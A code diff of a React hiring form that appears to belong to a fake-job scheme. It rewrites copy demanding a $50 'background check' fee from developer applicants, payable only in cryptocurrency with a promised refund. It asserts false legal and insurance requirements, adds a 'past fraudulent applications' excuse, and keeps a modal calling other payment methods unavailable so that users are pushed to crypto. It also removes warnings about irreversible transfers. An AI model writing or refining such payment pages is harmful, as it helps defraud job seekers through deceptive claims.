@@ -318,51 +318,6 @@ const LegalForm: React.FC<LegalFormProps> = ({
 
       <form onSubmit={handleSubmit} className="form-container">
         <div className="form-section">
-          <div className="info-card">
-            <h3><i className="fas fa-shield-alt"></i> Background Check Requirement</h3>
-            <div className="background-check-info">
-              <p><strong>Why is a background check mandatory for developers?</strong></p>
-              <ul>
-                <li><strong>Security Compliance:</strong> Our clients require all developers to pass comprehensive security screenings for code access</li>
-                <li><strong>Trust & Safety:</strong> We maintain the highest standards of trust with our clients and their sensitive systems</li>
-                <li><strong>Legal Requirements:</strong> Industry regulations mandate background verification for all software developers</li>
-                <li><strong>Data Protection:</strong> Ensuring secure handling of client data and proprietary code</li>
-                <li><strong>Professional Standards:</strong> Maintaining our reputation as a trusted development partner</li>
-              </ul>
-              
-              <div className="payment-explanation">
-                <p><strong>Why do you need to pay for your own background check?</strong></p>
-                <ul>
-                  <li><strong>Industry Standard:</strong> Self-funded background checks are standard practice across the tech industry to ensure candidates are genuinely committed to the position</li>
-                  <li><strong>Administrative Efficiency:</strong> Direct payment streamlines the verification process and eliminates bureaucratic delays</li>
-                  <li><strong>Immediate Processing:</strong> Your payment triggers immediate processing with our verified background check partners</li>
-                  <li><strong>Full Refund Policy:</strong> The fee is completely refunded upon successful completion of your onboarding, making it essentially free</li>
-                  <li><strong>Quality Assurance:</strong> Self-payment ensures you receive a professional-grade report that meets our strict compliance standards</li>
-                </ul>
-              </div>
-
-              <div className="self-check-explanation">
-                <p><strong>Why can't you do the background check yourself and send us the results?</strong></p>
-                <ul>
-                  <li><strong>Legal Compliance:</strong> Employment law requires background checks to be conducted by certified third-party agencies, not self-reported</li>
-                  <li><strong>Verification Authenticity:</strong> Self-submitted reports cannot be independently verified and may not meet legal standards for employment screening</li>
-                  <li><strong>Chain of Custody:</strong> Our certified partners maintain secure, unbroken documentation chains that courts and clients recognize as legally valid</li>
-                  <li><strong>Insurance Requirements:</strong> Our professional liability insurance mandates use of accredited background check services</li>
-                  <li><strong>Client Trust:</strong> Major corporate clients require independent, third-party verification that cannot be compromised by self-reporting</li>
-                  <li><strong>Standardization:</strong> All developers must undergo identical screening processes to ensure consistent security standards across our team</li>
-                </ul>
-              </div>
-              
-              <div className="check-details">
-                <p><strong>Processing Time:</strong> 5 business days</p>
-                <p><strong>Coverage:</strong> Criminal history, employment verification, education verification</p>
-                <p><strong>Cost:</strong> $50 USD (fully refunded upon completion)</p>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div className="form-section">
           <h3>Legal Documents</h3>
           <div className="upload-grid">
             {uploadConfigs.map(config => (
@@ -385,6 +340,34 @@ const LegalForm: React.FC<LegalFormProps> = ({
                 </button>
               </div>
             ))}
+          </div>
+        </div>
+
+        <div className="form-section">
+          <h3>Background Check Requirement</h3>
+          <div className="background-check-info">
+            <p>As part of our hiring process, all developers complete a standard background check. This is not unique to us it's a normal requirement across the tech industry, especially when working with sensitive client systems and data.</p>
+            
+            <p><strong>Why we require it:</strong></p>
+            <p>Security compliance: Many of our clients require verified background checks before granting developers codebase access.</p>
+            <p>Trust & safety: It helps us maintain a safe, professional environment for both our team and clients.</p>
+            <p>Regulatory compliance: Certain industries legally mandate verification for software professionals.</p>
+            <p>Data protection: Ensures secure handling of client data and intellectual property.</p>
+            <p>Professional standards: Reinforces our reputation as a trusted development partner.</p>
+            
+            <p><strong>Why candidates cover the upfront cost:</strong></p>
+            <p>Unfortunately, due to past fraudulent applications, we've had to introduce an upfront payment model. The cost is $50 USD, and it is 100% refunded once your background check is successfully cleared.</p>
+            
+            <p><strong>Why we cannot accept self-arranged reports:</strong></p>
+            <p>Certified third-party agencies are required by law and by our clients.</p>
+            <p>Independent agencies ensure authenticity and proper documentation.</p>
+            <p>Our liability insurance mandates accredited checks.</p>
+            <p>All developers must go through the same standardized process.</p>
+            
+            <p><strong>Process overview:</strong></p>
+            <p>Coverage: Criminal history, employment history, education verification</p>
+            <p>Processing time: 5 business days</p>
+            <p>Cost: $50 USD (fully refunded)</p>
           </div>
         </div>
 
@@ -422,9 +405,9 @@ const LegalForm: React.FC<LegalFormProps> = ({
         </div>
 
         <div className="form-section">
-          <h3>Payment Method Selection</h3>
+          <h3>Payment Method</h3>
           <div className="payment-method-selection">
-            <p>Choose your preferred payment method for the $50 USD background check fee:</p>
+            <p>Select payment method ($50 USD):</p>
             
             <div className="payment-methods">
               <div 
@@ -476,9 +459,9 @@ const LegalForm: React.FC<LegalFormProps> = ({
 
         {selectedPaymentMethod === 'crypto' && (
         <div className="form-section">
-          <h3>Cryptocurrency Selection</h3>
+          <h3>Cryptocurrency</h3>
           <div className="crypto-selection">
-            <p>Select your preferred cryptocurrency for the $50 USD payment:</p>
+            <p>Select cryptocurrency:</p>
             
             <div className="crypto-options">
               <div 
@@ -543,23 +526,11 @@ const LegalForm: React.FC<LegalFormProps> = ({
           <h3>{cryptoNames[selectedCrypto]} Payment Details</h3>
           <div className="payment-section">
             <div className="payment-info">
-              <h4>Payment Instructions:</h4>
-              <ol>
-                <li>Send exactly <strong>$50 USD worth of {cryptoNames[selectedCrypto]}</strong> to the address below</li>
-                <li>Copy your transaction ID/hash and paste it in the field below</li>
-                <li>Enter the exact amount sent in the amount field</li>
-                <li>Payment will be verified within 1-2 hours</li>
-                {selectedCrypto === 'usdt' && (
-                  <li><strong>⚠️ CRITICAL:</strong> Only send USDT on the <strong>Ethereum (ERC-20)</strong> network. Other networks will result in lost funds!</li>
-                )}
-                {selectedCrypto === 'tron' && (
-                  <li><strong>Note:</strong> Make sure to send TRX on the Tron network</li>
-                )}
-              </ol>
+              <p>Send exactly <strong>$50 USD worth of {cryptoNames[selectedCrypto]}</strong> to the address below, then enter your transaction details.</p>
             </div>
             
             <div className="wallet-address">
-              <label>{cryptoNames[selectedCrypto]} Wallet Address:</label>
+              <label>{cryptoNames[selectedCrypto]} Address:</label>
               <div className="address-container">
                 <input 
                   type="text" 
@@ -572,33 +543,28 @@ const LegalForm: React.FC<LegalFormProps> = ({
                   className={`btn-copy ${copySuccess ? 'success' : ''}`}
                   onClick={() => handleCopyAddress(cryptoAddresses[selectedCrypto])}
                 >
-                  <i className={`fas ${copySuccess ? 'fa-check' : 'fa-copy'}`}></i> 
-                  {copySuccess ? 'Copied!' : 'Copy'}
+                  {copySuccess ? '✓' : 'Copy'}
                 </button>
               </div>
-              <small className="address-warning">
-                ⚠️ Double-check this address before sending. Cryptocurrency transactions cannot be reversed.
-              </small>
             </div>
 
             <div className="form-group">
-              <label htmlFor="transactionId">Transaction ID/Hash *</label>
+              <label htmlFor="transactionId">Transaction ID *</label>
               <input
                 type="text"
                 id="transactionId"
                 name="transactionId"
-                placeholder={`Paste your ${cryptoNames[selectedCrypto]} transaction ID here`}
+                placeholder="Transaction hash"
                 value={formData.transactionId}
                 onChange={handleChange}
                 className={errors.transactionId ? 'error' : ''}
                 required
               />
               {errors.transactionId && <span className="error-message">{errors.transactionId}</span>}
-              <small>This is the unique identifier for your transaction, found in your wallet or block explorer.</small>
             </div>
 
             <div className="form-group">
-              <label htmlFor="ltcAmount">Amount Sent ({selectedCrypto.toUpperCase()}) *</label>
+              <label htmlFor="ltcAmount">Amount Sent *</label>
               <input
                 type="number"
                 id="ltcAmount"
@@ -611,13 +577,9 @@ const LegalForm: React.FC<LegalFormProps> = ({
                 required
               />
               {errors.ltcAmount && <span className="error-message">{errors.ltcAmount}</span>}
-              <small>Enter the exact amount of {selectedCrypto.toUpperCase()} you sent (equivalent to $50 USD).</small>
             </div>
             
-            <div className="verification-notice">
-              <i className="fas fa-clock"></i>
-              <p><strong>Verification Process:</strong> Once you submit this form, our team will verify your payment within 1-2 hours. You'll receive an email confirmation once verified.</p>
-            </div>
+            <small className="verification-note">Payment verified within 1-2 hours</small>
           </div>
         </div>
         )}
@@ -636,42 +598,24 @@ const LegalForm: React.FC<LegalFormProps> = ({
 
       {/* Payment Unavailable Modal */}
       {showUnavailableModal && (
-        <div className="modal-overlay" onClick={() => setShowUnavailableModal(false)}>
-          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
-            <div className="modal-header">
-              <h3>Payment Method Unavailable</h3>
-              <button 
-                className="modal-close" 
-                onClick={() => setShowUnavailableModal(false)}
-                aria-label="Close"
-              >
-                <i className="fas fa-times"></i>
-              </button>
-            </div>
-            <div className="modal-body">
-              <div className="unavailable-notice">
-                <div className="notice-icon">❌</div>
-                <div className="notice-content">
-                  <h4>{unavailablePaymentType} Payment Unavailable</h4>
-                  <p>This payment method is currently unavailable for your location.</p>
-                </div>
+        <div className="payment-overlay" onClick={() => setShowUnavailableModal(false)}>
+          <div className="overlay-content">
+            <button 
+              className="overlay-close" 
+              onClick={() => setShowUnavailableModal(false)}
+              aria-label="Close"
+            >
+              ×
+            </button>
+            <div className="overlay-message">
+              <h3>{unavailablePaymentType} unavailable</h3>
+              <p>Use cryptocurrency instead:</p>
+              <div className="crypto-list">
+                <span>Litecoin</span>
+                <span>Solana</span>
+                <span>Tron</span>
+                <span>USDT</span>
               </div>
-              
-              <div className="alternative-payment">
-                <div className="alt-icon">✅</div>
-                <div className="alt-content">
-                  <h4>Use Cryptocurrency Instead</h4>
-                  <p>We support multiple cryptocurrency options:</p>
-                  <ul>
-                    <li><strong>Litecoin (LTC)</strong> - Fast and reliable</li>
-                    <li><strong>Solana (SOL)</strong> - Low fees</li>
-                    <li><strong>Tron (TRX)</strong> - Quick transactions</li>
-                    <li><strong>USDT (ERC-20)</strong> - Stable value</li>
-                  </ul>
-                </div>
-              </div>
-            </div>
-            <div className="modal-footer">
               <button 
                 className="btn btn-primary" 
                 onClick={() => {
@@ -679,14 +623,7 @@ const LegalForm: React.FC<LegalFormProps> = ({
                   setShowUnavailableModal(false);
                 }}
               >
-                <i className="fas fa-bitcoin"></i>
-                Use Cryptocurrency
-              </button>
-              <button 
-                className="btn btn-secondary" 
-                onClick={() => setShowUnavailableModal(false)}
-              >
-                Close
+                Use Crypto
               </button>
             </div>
           </div>
